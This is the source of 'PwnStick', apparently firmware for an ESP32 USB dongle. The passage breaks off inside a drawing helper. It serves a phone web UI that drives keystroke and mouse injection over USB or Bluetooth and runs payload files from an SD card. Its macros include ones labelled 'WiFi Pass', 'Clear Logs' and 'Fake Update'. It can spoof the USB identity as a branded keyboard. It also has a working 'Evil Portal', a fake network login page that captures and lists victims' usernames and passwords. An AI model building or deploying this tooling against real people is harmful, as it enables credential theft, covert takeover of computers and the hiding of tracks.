#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ESPmDNS.h>
#include "SD_MMC.h"
#include <Preferences.h>
#include "USB.h"
#include "HidDriver.h"
#include "UsbHidDriver.h"
#include "BleHidDriver.h"

#define KEY_LEFT_CTRL   0x80
#define KEY_LEFT_SHIFT  0x81
#define KEY_LEFT_ALT    0x82
#define KEY_LEFT_GUI    0x83
#define KEY_UP_ARROW    0xDA
#define KEY_DOWN_ARROW  0xD9
#define KEY_LEFT_ARROW  0xD8
#define KEY_RIGHT_ARROW 0xD7
#define KEY_BACKSPACE   0xB2
#define KEY_RETURN      0xB0
#define KEY_TAB         0xB3
#define KEY_ESC         0xB1
#define KEY_DELETE      0xD4
#define KEY_F1          0xC2
#define KEY_F2          0xC3
#define KEY_F11         0xCC
#define MOUSE_LEFT      1
#define MOUSE_RIGHT     2
#define MOUSE_MIDDLE    4

#include <FastLED.h>
#include "esp_lcd_panel_io.h"
#include "esp_lcd_panel_ops.h"
#include "esp_lcd_panel_vendor.h"
#include "esp_lcd_st7735.h"
#include <Fonts/glcdfont.c>
#include "qr_code.h"

#define LED_DI_PIN     40
#define NUM_LEDS       1
#define PIN_NUM_MOSI   3
#define PIN_NUM_CLK    5
#define PIN_NUM_CS     4
#define PIN_NUM_DC     2
#define PIN_NUM_RST    1
#define PIN_NUM_BCKL   38
#define BTN_PIN        0

// SD MMC pins (LILYGO T-Dongle-S3)
#define SD_CLK  12
#define SD_CMD  16
#define SD_D0   14
#define SD_D1   17
#define SD_D2   21
#define SD_D3   18

#define C_GREEN  0x07E0
#define C_RED    0xF800
#define C_BLACK  0x0000
#define C_WHITE  0xFFFF
#define C_YELLOW 0xFFE0

inline uint16_t SWAP(uint16_t v) { return (v >> 8) | (v << 8); }

// ── HID ──────────────────────────────────────────────────────────────────────
CRGB leds[NUM_LEDS];
IHidDriver* activeDriver = nullptr;
UsbHidDriver usbDriver;
BleHidDriver bleDriver;
bool isBleMode = false;

void setHidMode(bool useBle) {
    isBleMode = useBle;
    activeDriver = useBle ? (IHidDriver*)&bleDriver : (IHidDriver*)&usbDriver;
}

// ── Server ───────────────────────────────────────────────────────────────────
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
DNSServer dnsServer;

// ── Display ──────────────────────────────────────────────────────────────────
static esp_lcd_panel_handle_t panel_handle = NULL;
static esp_lcd_panel_io_handle_t io_handle = NULL;
static uint16_t screen_buf[160 * 80];
static uint16_t* custom_img_buf = nullptr;
static uint16_t* gif_storage[15];
static int gif_count = 0, gif_idx = 0;
static unsigned long last_gif_ms = 0;
static bool gif_mode = false;

// ── State ────────────────────────────────────────────────────────────────────
const char* ssid = "PwnStick";
String targetOS = "win";
String lastKey = "";
unsigned long lastKeyTime = 0;
bool show_img = false;
bool user_on_site = false;
bool forceQR = false;
int cursorX = 80, cursorY = 40;
int showCursorFrames = 0;

bool jigglerEnabled = false;
unsigned long lastJiggle = 0;

bool evilPortalEnabled = false;
String credsJson = "[]";

bool sdAvailable = false;
bool duckyRunning = false;
bool payloadPending = false;
String pendingPayload = "";

int ledFlashCount = 0;

static uint32_t binaryOffset = 0;

void setLastKey(String k) { lastKey = k; lastKeyTime = millis(); }
void flashLed() { ledFlashCount = 4; }

// ── HTML: main UI ─────────────────────────────────────────────────────────────
const char index_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
<title>PwnStick v53</title>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;user-select:none;-webkit-user-select:none}
body{background:#000;color:#0f0;font-family:monospace;margin:0;height:100dvh;display:flex;flex-direction:column;overflow:hidden}
#sbar{background:#050505;border-bottom:1px solid #111;padding:4px 10px;font-size:11px;color:#444;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}
#sbar b{color:#0a0}
.tabs{display:flex;background:#0a0a0a;border-bottom:1px solid #0f0;flex-shrink:0}
.tab{flex:1;padding:11px 4px;cursor:pointer;font-weight:bold;font-size:12px;color:#444;border-right:1px solid #111;text-align:center;letter-spacing:.5px}
.tab:last-child{flex:0 0 44px}
.tab.active{color:#0f0;border-bottom:2px solid #0f0}
.pane{padding:8px;display:none;flex:1;overflow:hidden;flex-direction:column;gap:6px;min-height:0}
.pane.active{display:flex}
button{background:#0a0a0a;color:#0f0;border:1px solid #222;padding:11px 6px;font-weight:bold;font-size:12px;font-family:monospace;border-radius:5px;cursor:pointer;flex:1;flex-shrink:0}
button:active,button.on{background:#0f0;color:#000;border-color:#0f0}
button.warn{border-color:#f80;color:#f80}
button.warn.on{background:#f80;color:#000;border-color:#f80}
button.danger{border-color:#f44;color:#f44}
button.danger:active{background:#f44;color:#000}
.row{display:flex;gap:5px;flex-shrink:0}
textarea{width:100%;height:44px;background:#080808;color:#0f0;border:1px solid #1a1a1a;border-radius:5px;padding:8px;font-size:15px;font-family:monospace;outline:none;resize:none;flex-shrink:0;user-select:auto;-webkit-user-select:auto}
textarea:focus{border-color:#333}
#pad-wrap{flex:1;display:flex;flex-direction:column;min-height:80px}
#pad{flex:1;background:#050505;border:1px solid #1a1a1a;border-radius:8px 8px 0 0;display:flex;align-items:center;justify-content:center;color:#111;font-weight:bold;font-size:16px;touch-action:none;cursor:crosshair}
.click-row{display:flex;height:44px;gap:2px;flex-shrink:0}
.click-btn{flex:1;background:#050505;border:1px solid #1a1a1a;border-top:none;border-radius:0 0 5px 5px;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#222;font-size:11px;font-family:monospace}
.click-btn:active{background:#0f0;color:#000;border-color:#0f0}
#crop-wrap{width:100%;max-width:600px;border:1px solid #1a1a1a;margin:0 auto;background:#050505;position:relative;overflow:hidden;aspect-ratio:160/80;flex-shrink:1;border-radius:5px}
#crop-canvas{display:block;width:100%;height:100%;image-rendering:pixelated;cursor:move}
.file-btn{position:relative;overflow:hidden;width:100%;flex-shrink:0}
#img-f{position:absolute;inset:0;opacity:0;cursor:pointer}
.opt-box{background:#080808;border:1px solid #1a1a1a;border-radius:5px;padding:8px;display:none;flex-direction:column;gap:5px;font-size:11px;flex-shrink:0}
.opt-row{display:flex;justify-content:space-between;align-items:center;color:#888}
input[type=number]{background:#000;color:#0f0;border:1px solid #333;border-radius:3px;width:45px;padding:3px 5px;font-family:monospace}
.status{color:#555;font-size:11px;flex-shrink:0;min-height:14px}
.pl-item{display:flex;align-items:center;justify-content:space-between;background:#080808;border:1px solid #1a1a1a;border-radius:5px;padding:8px 10px;gap:8px}
.pl-name{color:#0a0;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
.pl-run{flex:none;width:55px;padding:7px;font-size:11px}
#pl-list{overflow-y:auto;flex:1;display:flex;flex-direction:column;gap:4px}
.srow{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid #111;flex-shrink:0}
.srow label{color:#888;font-size:13px}
.stgl{flex:none;width:70px;padding:7px;font-size:12px;background:#0a0a0a;border-color:#333;color:#555}
.stgl.on{background:#0f0;color:#000;border-color:#0f0}
#modal{position:fixed;inset:0;background:rgba(0,0,0,.97);display:none;flex-direction:column;padding:16px;z-index:100}
.modal-os{display:flex;gap:6px;margin-bottom:14px;flex-shrink:0}
#m-list{flex:1;overflow-y:auto;display:grid;gap:8px;padding-bottom:10px}
.modal-close{flex-shrink:0;margin-top:8px;background:#111;border-color:#333;color:#888}
.cred-entry{background:#080808;border:1px solid #1a1a1a;border-radius:4px;padding:8px;font-size:11px;word-break:break-all;margin-bottom:4px}
.cred-entry .u{color:#0f0}.cred-entry .p{color:#f80}.cred-entry .t{color:#555;font-size:10px}
#creds-list{overflow-y:auto;max-height:200px}
select{background:#000;color:#0f0;border:1px solid #333;padding:6px;font-family:monospace;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div id="sbar"><b id="sb-mode">USB</b><span id="sb-os">WIN</span><span id="sb-sd" style="color:#555">SD:--</span><span id="sb-c">0 clients</span></div>
<div id="modal">
  <div class="modal-os">
    <button id="m-win" class="on" onclick="setOS('win')">WIN</button>
    <button id="m-lin" onclick="setOS('lin')">LINUX</button>
    <button id="m-med" onclick="setOS('med')">MEDIA</button>
  </div>
  <div id="m-list"></div>
  <button class="modal-close" onclick="document.getElementById('modal').style.display='none'">x CLOSE</button>
</div>
<div class="tabs">
  <div class="tab active" onclick="sT('ctl',this)">CONTROL</div>
  <div class="tab" onclick="sT('pl',this);loadPL()">PAYLOADS</div>
  <div class="tab" onclick="sT('ig',this)">IMAGE</div>
  <div class="tab" onclick="sT('set',this)"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></div>
</div>

<div id="c-ctl" class="pane active">
  <div class="row">
    <button id="mod-win" onmousedown="mD('win',this)" onmouseup="mU('win',this)">WIN</button>
    <button id="mod-ctrl" onmousedown="mD('ctrl',this)" onmouseup="mU('ctrl',this)">CTRL</button>
    <button id="mod-alt" onmousedown="mD('alt',this)" onmouseup="mU('alt',this)">ALT</button>
    <button id="mod-shift" onmousedown="mD('shift',this)" onmouseup="mU('shift',this)">SHIFT</button>
  </div>
  <textarea id="ta" placeholder="Type or paste text here..."></textarea>
  <div class="row">
    <button onclick="oM()" style="flex:3;border-color:#0a0;color:#0a0">MACROS</button>
    <button id="jig-btn" onclick="togJig(this)" class="warn" style="flex:2">JIGGLER</button>
  </div>
  <div id="pad-wrap">
    <div id="pad">TRACKPAD</div>
    <div class="click-row">
      <div class="click-btn" onmousedown="wsS('D:l')" onmouseup="wsS('U:l')" ontouchstart="wsS('D:l')" ontouchend="wsS('U:l')">L</div>
      <div class="click-btn" onmousedown="wsS('D:r')" onmouseup="wsS('U:r')" ontouchstart="wsS('D:r')" ontouchend="wsS('U:r')">R</div>
    </div>
  </div>
</div>

<div id="c-pl" class="pane">
  <div class="status" id="pl-status">Loading...</div>
  <div id="pl-list"></div>
  <button onclick="wsS('PAYLOAD:stop')" class="danger" style="margin-top:auto">STOP</button>
</div>

<div id="c-ig" class="pane">
  <div class="file-btn"><button style="width:100%">SELECT IMAGE / GIF</button><input type="file" id="img-f" accept="image/*"></div>
  <div id="gif-opts" class="opt-box">
    <div class="opt-row"><span>Frames:</span><input type="number" id="g-cnt" value="5" min="1" max="15"></div>
    <div class="opt-row"><span>Skip:</span><input type="number" id="g-skp" value="1" min="0" max="10"></div>
  </div>
  <div id="img-status" class="status"></div>
  <div id="crop-wrap"><canvas id="crop-canvas" width="160" height="80"></canvas></div>
  <div id="ig-controls" style="display:none;flex-shrink:0">
    <div class="row" style="margin-top:5px"><button onclick="z(-0.02)">ZOOM -</button><button onclick="z(0.02)">ZOOM +</button><button onclick="rot()">ROT 90</button></div>
    <button id="b-up" onclick="upl()" style="width:100%;margin-top:5px;height:44px;font-size:15px;border-color:#0a0;color:#0a0">UPLOAD TO DONGLE</button>
  </div>
  <button onclick="wsS('I:clear')" style="margin-top:auto;border-color:#333;color:#444">CLEAR SCREEN</button>
</div>

<div id="c-set" class="pane" style="overflow-y:auto">
  <div class="srow"><label>BLE Mode</label><button id="tgl-ble" class="stgl" onclick="togBLE(this)">OFF</button></div>
  <div class="srow"><label>Mouse Jiggler</label><button id="tgl-jig2" class="stgl" onclick="togJig2(this)">OFF</button></div>
  <div class="srow"><label>Evil Portal</label><button id="tgl-ep" class="stgl" onclick="togEP(this)">OFF</button></div>
  <div id="ep-section" style="display:none;padding:8px 0">
    <div class="row" style="margin-bottom:6px">
      <button onclick="loadCreds()" style="flex:2;font-size:11px;padding:7px">REFRESH</button>
      <button onclick="wsS('CREDS:clear');document.getElementById(\'creds-list\').innerHTML=\'\'" class="danger" style="flex:1;font-size:11px;padding:7px">CLEAR</button>
    </div>
    <div id="creds-list"></div>
  </div>
  <div class="srow">
    <label>USB Identity</label>
    <select id="vid-sel" onchange="wsS('VID:'+this.value)">
      <option value="gen">Generic HID</option>
      <option value="apple">Apple Keyboard</option>
      <option value="dell">Dell Keyboard</option>
      <option value="logi">Logitech Keyboard</option>
    </select>
  </div>
  <div style="padding:8px 0;font-size:11px;color:#555">(USB identity takes effect on replug)</div>
  <div class="srow" style="margin-top:4px"><label style="font-weight:bold;color:#0a0">Bonded BLE Devices</label><button onclick="wsS('B:list')" style="flex:none;width:70px;height:26px;padding:0;font-size:10px;border-color:#333;color:#555">Refresh</button></div>
  <div id="ble-list" style="display:flex;flex-direction:column;gap:4px;margin-top:4px"></div>
</div>

<script>
let ws=new WebSocket('ws://'+location.host+'/ws');
let os='win',isGif=false,gifBytes=null,jigglerOn=false,epOn=false;
const mcs={
  win:[{n:'Terminal',a:'term'},{n:'Calculator',a:'calc'},{n:'Rickroll',a:'rick'},{n:'Admin PS',a:'ps_admin'},{n:'WiFi Pass',a:'wifi_pass'},{n:'Fake Update',a:'fake_upd'},{n:'Notepad Ghost',a:'note_ghost'},{n:'Clear Logs',a:'win_clr'},{n:'System Info',a:'win_info'}],
  lin:[{n:'Terminal',a:'term'},{n:'Calculator',a:'calc'},{n:'SSH Snake',a:'snake'},{n:'Rickroll',a:'rick'},{n:'Sys Recon',a:'lin_recon'},{n:'Net Info',a:'lin_net'},{n:'WiFi Pass',a:'lin_wifi'},{n:'Fake Update',a:'fake_upd'}],
  med:[{n:'Prev',a:'m_prev'},{n:'Play/Pause',a:'m_pp'},{n:'Next',a:'m_next'},{n:'Vol-',a:'m_vdn'},{n:'Mute',a:'m_mute'},{n:'Vol+',a:'m_vup'},{n:'Bright-',a:'m_bdn'},{n:'Bright+',a:'m_bup'},{n:'Stop',a:'m_stop'},{n:'Back',a:'m_back'},{n:'Home',a:'m_home'},{n:'Fwd',a:'m_fwd'},{n:'Browser',a:'m_web'},{n:'Search',a:'m_srch'},{n:'Bookmarks',a:'m_book'},{n:'Refresh',a:'m_refr'},{n:'Calc',a:'m_calc'},{n:'Email',a:'m_mail'},{n:'Airplane',a:'m_air'},{n:'Sleep',a:'m_sleep'},{n:'Power',a:'m_power'},{n:'Screenshot',a:'m_scr'}]
};
function wsS(m){if(ws.readyState===1)ws.send(m);}
function sT(t,el){
  document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
  document.querySelectorAll('.pane').forEach(x=>x.classList.remove('active'));
  el.classList.add('active');document.getElementById('c-'+t).classList.add('active');
}
function setOS(o){
  os=o;wsS('O:'+o);document.getElementById('sb-os').textContent=o.toUpperCase();
  ['win','lin','med'].forEach(x=>{let b=document.getElementById('m-'+x);if(x===o)b.classList.add('on');else b.classList.remove('on');});
  buildMacros();
}
function oM(){document.getElementById('modal').style.display='flex';buildMacros();}
function buildMacros(){
  let l=document.getElementById('m-list');l.innerHTML='';
  l.style.gridTemplateColumns=(os==='med')?'1fr 1fr 1fr':'1fr 1fr';
  mcs[os].forEach(m=>{let b=document.createElement('button');b.textContent=m.n;b.onclick=()=>wsS('A:'+m.a);l.appendChild(b);});
}
function mD(m,el){el.dataset.h=setTimeout(()=>{el.classList.toggle('on');wsS('H:'+m+','+(el.classList.contains('on')?'1':'0'));el.dataset.h=0;},500);}
function mU(m,el){if(el.dataset.h){clearTimeout(el.dataset.h);wsS('P:'+m);el.dataset.h=0;}}
function togJig(btn){jigglerOn=!jigglerOn;wsS('JIG:'+(jigglerOn?'1':'0'));btn.classList.toggle('on',jigglerOn);document.getElementById('tgl-jig2').classList.toggle('on',jigglerOn);document.getElementById('tgl-jig2').textContent=jigglerOn?'ON':'OFF';}
function togJig2(btn){jigglerOn=!jigglerOn;wsS('JIG:'+(jigglerOn?'1':'0'));btn.classList.toggle('on',jigglerOn);btn.textContent=jigglerOn?'ON':'OFF';document.getElementById('jig-btn').classList.toggle('on',jigglerOn);}
function togBLE(btn){let on=btn.classList.toggle('on');wsS('T:'+(on?'ble':'usb'));btn.textContent=on?'ON':'OFF';document.getElementById('sb-mode').textContent=on?'BLE':'USB';document.getElementById('sb-mode').style.color=on?'#44f':'#0a0';}
function togEP(btn){epOn=!epOn;wsS('EP:'+(epOn?'1':'0'));btn.classList.toggle('on',epOn);btn.textContent=epOn?'ON':'OFF';document.getElementById('ep-section').style.display=epOn?'block':'none';if(epOn)loadCreds();}
function escH(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
async function loadCreds(){
  try{
    let r=await fetch('/creds');let d=await r.json();
    let el=document.getElementById('creds-list');
    if(!d.length){el.innerHTML='<div class="status">No captures yet.</div>';return;}
    el.innerHTML=d.map(c=>`<div class="cred-entry"><span class="t">[${c.t}s] </span><span class="u">${escH(c.u)}</span>  <span class="p">${escH(c.p)}</span></div>`).join('');
  }catch(e){}
}
async function loadPL(){
  let el=document.getElementById('pl-list'),st=document.getElementById('pl-status');
  try{
    let r=await fetch('/payloads');let d=await r.json();
    st.textContent=d.sd?('SD Ready — '+d.files.length+' payload(s)'):'SD card not detected';
    el.innerHTML='';
    d.files.forEach(f=>{
      let row=document.createElement('div');row.className='pl-item';
      row.innerHTML=`<span class="pl-name">${escH(f)}</span><button class="pl-run" onclick="wsS('RUN:${escH(f)}')">RUN</button>`;
      el.appendChild(row);
    });
    if(!d.files.length&&d.sd)el.innerHTML='<div class="status">No .txt files in /payloads/ on SD card.</div>';
  }catch(e){st.textContent='Error loading payloads';}
}
let ta=document.getElementById('ta');
ta.onkeydown=e=>{
  if(e.key.startsWith('Arrow')){e.preventDefault();wsS('A:'+e.key.toLowerCase());return;}
  if(e.ctrlKey&&e.key==='Backspace'){e.preventDefault();wsS('A:cb');return;}
  if(e.key==='Enter'){e.preventDefault();wsS('E:1');return;}
  if(e.key==='Backspace'){e.preventDefault();wsS('B:1');return;}
};
ta.oninput=e=>{if(e.inputType==='insertFromPaste'||ta.value.length>1){wsS('V:'+ta.value);ta.value='';}else{let c=ta.value.slice(-1);ta.value='';if(c)wsS('K:'+c);}};
let p=document.getElementById('pad'),lX=0,lY=0,isD=false,tapT=0,maxT=0;
p.onmousedown=e=>{isD=true;lX=e.clientX;lY=e.clientY;tapT=Date.now();maxT=1;};
window.onmouseup=()=>{if(isD&&Date.now()-tapT<200)wsS(maxT===2?'C:r':'C:l');isD=false;maxT=0;};
p.onmousemove=e=>{if(isD){let dx=e.clientX-lX,dy=e.clientY-lY;wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5));lX=e.clientX;lY=e.clientY;}};
p.ontouchstart=e=>{isD=true;lX=e.touches[0].clientX;lY=e.touches[0].clientY;tapT=Date.now();maxT=Math.max(maxT,e.touches.length);};
p.ontouchend=e=>{if(isD&&Date.now()-tapT<200)wsS(maxT===2?'C:r':'C:l');isD=false;maxT=0;};
p.ontouchmove=e=>{
  if(isD){maxT=Math.max(maxT,e.touches.length);let dx=e.touches[0].clientX-lX,dy=e.touches[0].clientY-lY;
    if(e.touches.length===2){if(Math.abs(dy)>5){wsS('W:'+(dy>0?-1:1));lY=e.touches[0].clientY;}}
    else{wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5));lX=e.touches[0].clientX;lY=e.touches[0].clientY;}
  }e.preventDefault();
};
ws.onmessage=e=>{
  if(typeof e.data!=='string')return;
  if(e.data.startsWith('B:')){
    let devs=JSON.parse(e.data.substring(2)),bl=document.getElementById('ble-list');
    bl.innerHTML='';
    devs.forEach(d=>{
      let row=document.createElement('div');
      row.style.cssText='background:#080808;border:1px solid #1a1a1a;border-radius:5px;padding:8px;display:flex;flex-direction:column;gap:5px;';
      row.innerHTML=`<div style="display:flex;justify-content:space-between;align-items:center"><span style="color:#0f0;font-size:13px">${d.name}</span><span style="color:#444;font-size:10px">${d.mac}</span></div>
      <div class="row" style="gap:4px"><button onclick="wsS('B:conn:${d.mac}')" style="border-color:#0a0;color:#0a0;font-size:11px;padding:6px">Connect</button><button onclick="let n=prompt('Name:','${d.name}');if(n)wsS('B:ren:${d.mac}:'+n)" style="border-color:#880;color:#880;font-size:11px;padding:6px">Rename</button><button onclick="if(confirm('Delete?'))wsS('B:del:${d.mac}')" class="danger" style="font-size:11px;padding:6px">Del</button></div>`;
      bl.appendChild(row);
    });
  } else if(e.data==='VIDACK'){
    alert('USB identity saved. Replug device to apply.');
  } else if(e.data.startsWith('SBUPD:')){
    let p=e.data.substring(6).split(',');
    document.getElementById('sb-c').textContent=p[0]+' client(s)';
    document.getElementById('sb-sd').textContent='SD:'+(p[1]==='1'?'OK':'--');
    document.getElementById('sb-sd').style.color=p[1]==='1'?'#0a0':'#555';
  }
};
ws.onopen=()=>wsS('U:1');
let scale=1,rotation=0,oX=0,oY=0,cvs=document.getElementById('crop-canvas'),ctx=cvs.getContext('2d'),curImg=new Image(),pD=0,cCvs=document.createElement('canvas'),cCtx=cCvs.getContext('2d');
document.getElementById('img-f').onchange=e=>{
  let f=e.target.files[0];if(!f)return;
  isGif=(f.type==='image/gif');
  let r=new FileReader();r.onload=ev=>{
    gifBytes=new Uint8Array(ev.target.result);
    curImg.onload=()=>{
      document.getElementById('ig-controls').style.display='block';
      document.getElementById('gif-opts').style.display=isGif?'flex':'none';
      scale=Math.max(160/curImg.width,80/curImg.height);oX=0;oY=0;rotation=0;drw(true);
    };curImg.src=URL.createObjectURL(new Blob([gifBytes]));
  };r.readAsArrayBuffer(f);
};
function drw(clr,imgOverride){
  if(clr){ctx.fillStyle='#000';ctx.fillRect(0,0,160,80);}
  let t=imgOverride||curImg;
  ctx.save();ctx.translate(160/2+oX,80/2+oY);ctx.rotate(rotation*Math.PI/180);
  ctx.drawImage(t,-t.width*scale/2,-t.height*scale/2,t.width*scale,t.height*scale);
  ctx.restore();
}
function z(v){scale+=v;drw(true);}function rot(){rotation=(rotation+90)%360;drw(true);}
cvs.onmousedown=e=>{isD=true;lX=e.clientX;lY=e.clientY;};
cvs.onmousemove=e=>{if(isD){let r=160/cvs.offsetWidth;oX+=(e.clientX-lX)*r;oY+=(e.clientY-lY)*r;lX=e.clientX;lY=e.clientY;drw(true);}};
cvs.ontouchstart=e=>{if(e.touches.length===2)pD=Math.hypot(e.touches[0].pageX-e.touches[1].pageX,e.touches[0].pageY-e.touches[1].pageY);else{isD=true;lX=e.touches[0].clientX;lY=e.touches[0].clientY;}};
cvs.ontouchmove=e=>{let r=160/cvs.offsetWidth;if(e.touches.length===2){let d=Math.hypot(e.touches[0].pageX-e.touches[1].pageX,e.touches[0].pageY-e.touches[1].pageY);scale*=(d/pD);pD=d;drw(true);}else if(isD){oX+=(e.touches[0].clientX-lX)*r;oY+=(e.touches[0].clientY-lY)*r;lX=e.touches[0].clientX;lY=e.touches[0].clientY;drw(true);}e.preventDefault();};
async function upl(){
  let btn=document.getElementById('b-up');btn.disabled=true;
  try{
    if(isGif){
      wsS('I:gif');
      let lw=gifBytes[6]|(gifBytes[7]<<8),lh=gifBytes[8]|(gifBytes[9]<<8);
      let hasGCT=(gifBytes[10]&0x80),gctSize=hasGCT?3*Math.pow(2,(gifBytes[10]&7)+1):0;
      let header=gifBytes.slice(0,13+gctSize);
      cCvs.width=lw;cCvs.height=lh;cCtx.clearRect(0,0,lw,lh);
      let frames=[],pos=13+gctSize,curF=[];
      while(pos<gifBytes.length&&gifBytes[pos]!==0x3B&&frames.length<50){
        let b=gifBytes[pos];
        if(b===0x21){let st=pos;pos+=2;while(pos<gifBytes.length&&gifBytes[pos]!==0)pos+=gifBytes[pos]+1;pos++;if(gifBytes[st+1]===0xF9)curF.push(gifBytes.slice(st,pos));}
        else if(b===0x2C){
          let st=pos,x=gifBytes[pos+1]|(gifBytes[pos+2]<<8),y=gifBytes[pos+3]|(gifBytes[pos+4]<<8),w=gifBytes[pos+5]|(gifBytes[pos+6]<<8),h=gifBytes[pos+7]|(gifBytes[pos+8]<<8);
          pos+=10;if(gifBytes[pos-1]&0x80)pos+=3*Math.pow(2,(gifBytes[pos-1]&7)+1);pos++;
          while(pos<gifBytes.length&&gifBytes[pos]!==0)pos+=gifBytes[pos]+1;pos++;
          curF.push(gifBytes.slice(st,pos));
          let len=header.length+1;for(let c of curF)len+=c.length;
          let f=new Uint8Array(len);f.set(header,0);let off=header.length;
          for(let c of curF){f.set(c,off);off+=c.length;}f[off]=0x3B;
          frames.push({blob:URL.createObjectURL(new Blob([f],{type:'image/gif'})),x,y,w,h});curF=[];
        }else pos++;
      }
      let maxF=parseInt(document.getElementById('g-cnt').value)||5,skip=parseInt(document.getElementById('g-skp').value)||0,sI=0;
      for(let i=0;i<frames.length&&sI<maxF;i++){
        let f=frames[i];
        await new Promise(res=>{let tmp=new Image();tmp.onload=()=>{cCtx.drawImage(tmp,f.x,f.y,f.w,f.h);if(i%(skip+1)===0){drw(true,cCvs);let d=ctx.getImageData(0,0,160,80).data,b=new Uint8Array(25600);for(let j=0;j<12800;j++){let r=d[j*4],g=d[j*4+1],bl=d[j*4+2];let rgb=((r&0xF8)<<8)|((g&0xFC)<<3)|(bl>>3);b[j*2]=rgb>>8;b[j*2+1]=rgb&0xFF;}ws.send(b);sI++;document.getElementById('img-status').textContent='Sending '+sI+'/'+maxF;}res();};tmp.src=f.blob;});
        if(i%(skip+1)===0)await new Promise(r=>setTimeout(r,400));
      }
      document.getElementById('img-status').textContent='Done!';drw(true);
    }else{
      wsS('I:img');let d=ctx.getImageData(0,0,160,80).data,b=new Uint8Array(25600);
      for(let j=0;j<12800;j++){let r=d[j*4],g=d[j*4+1],bl=d[j*4+2];let rgb=((r&0xF8)<<8)|((g&0xFC)<<3)|(bl>>3);b[j*2]=rgb>>8;b[j*2+1]=rgb&0xFF;}
      ws.send(b);document.getElementById('img-status').textContent='Done!';
    }
  }catch(e){console.error(e);}
  btn.disabled=false;
}
</script>
</body>
</html>)rawliteral";

// ── HTML: Evil Portal ─────────────────────────────────────────────────────────
const char evil_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head><title>Network Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f2f2f7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;padding:32px 24px;width:100%;max-width:360px;box-shadow:0 2px 20px rgba(0,0,0,.1)}
.icon{text-align:center;font-size:48px;margin-bottom:20px}
h2{font-size:22px;font-weight:600;color:#1c1c1e;margin-bottom:6px;text-align:center}
.sub{font-size:14px;color:#8e8e93;text-align:center;margin-bottom:24px}
input{width:100%;padding:14px 16px;border:1.5px solid #e5e5ea;border-radius:10px;font-size:16px;outline:none;margin-bottom:12px;color:#1c1c1e;transition:border-color .2s}
input:focus{border-color:#007aff}
button{width:100%;padding:14px;background:#007aff;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:4px}
button:active{background:#0062cc}
.footer{margin-top:20px;text-align:center;font-size:12px;color:#c7c7cc}
</style>
</head>
<body>
<div class="card">
<div class="icon">&#128246;</div>
<h2>Network Login</h2>
<div class="sub">Sign in to access the internet</div>
<form method="POST" action="/capture">
<input name="user" type="text" placeholder="Email or Username" autocomplete="email" required>
<input name="pass" type="password" placeholder="Password" autocomplete="current-password" required>
<button type="submit">Sign In</button>
</form>
<div class="footer">Secured connection &middot; Terms of Use</div>
</div>
</body>
</html>)rawliteral";

// ── HTML: Capture success ─────────────────────────────────────────────────────
const char capture_success_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html><head><title>Connected</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f2f2f7;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.card{background:#fff;border-radius:16px;padding:32px;text-align:center;max-width:320px;width:100%;box-shadow:0 2px 20px rgba(0,0,0,.1)}.icon{font-size:56px;margin-bottom:16px}.title{font-size:22px;font-weight:600;color:#1c1c1e;margin-bottom:8px}.sub{color:#8e8e93;font-size:14px}</style>
</head><body><div class="card"><div class="icon">&#9989;</div><div class="title">Connected</div><div class="sub">You are now connected to the internet.</div></div></body></html>)rawliteral";

// ── Draw helpers ──────────────────────────────────────────────────────────────
void drawChar(int x, int y, char c, uint16_t color, int scale) {
    if (c < 0 || c > 255) return;
    for (int i = 0; i < 5; i++) {
        uint8_t line = pgm_read_byte(&font[c * 5 + i]);
        for (int j = 0; j < 8; j++) {
            if (line & 0x1) {
                for (int sx = 0; sx < scale; sx++) for (int sy = 0; sy < scale; sy++) {
                    int px = x + i*scale + sx, py = y + j*scale + sy;
                    if (px >= 0 && px < 160 && py >= 0 && py < 80)
